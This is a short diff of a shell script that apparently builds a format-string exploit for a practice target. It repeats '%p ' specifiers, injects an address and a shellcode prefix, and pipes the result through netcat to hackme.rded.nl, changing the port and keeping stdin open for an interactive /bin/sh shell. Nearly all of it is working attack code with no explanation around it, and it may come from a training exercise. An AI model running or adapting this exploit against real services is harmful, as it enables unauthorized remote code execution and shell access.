@@ -33,6 +33,7 @@ for i in $(seq 1 $1);
 do 
     attackstr="${attackstr}%p "
 done
+# attackstr="${attackstr}CC$(./reverseaddr 0x123456789ABCDEF)AAAAAAA\x00\x01BC"
 
 # at the end, we inject our desired address obtained from argument 2
 if ! [ "$2" = "" ]; then
@@ -40,10 +41,10 @@ if ! [ "$2" = "" ]; then
 fi
 
 # third argument is padding for our address
-if ! [ "$3" = "" ]; then
+if ! [ "$3" = "" ]; then 
         attackstr="$(./shellcode list $3)${attackstr}"
     # for i in $(seq 0 $3); do
-    #    attackstr="A${attackstr}"
+    #    attackstr="A${attackstr}" 
     # done
 fi
 
@@ -58,5 +59,6 @@ echo "Attackstring is $(echo -n $attackstr | wc -c) bytes" >&2  # print to stder
 # echo $attackstr | nc hackme.rded.nl 57065 # Comment me out if you want to run the /bin/ls shell code (./shellcode list)
 
 # Uncomment if you want to run the /bin/sh shell code (./shellcode shell)
-(echo $attackstr; cat -) | nc hackme.rded.nl 46260
+# echo $attackstr
+(echo $attackstr; cat -) | nc hackme.rded.nl 24142
 ## This composed command allows stdin to remain open, which would otherwise have been closed by the EOF sent by echo.
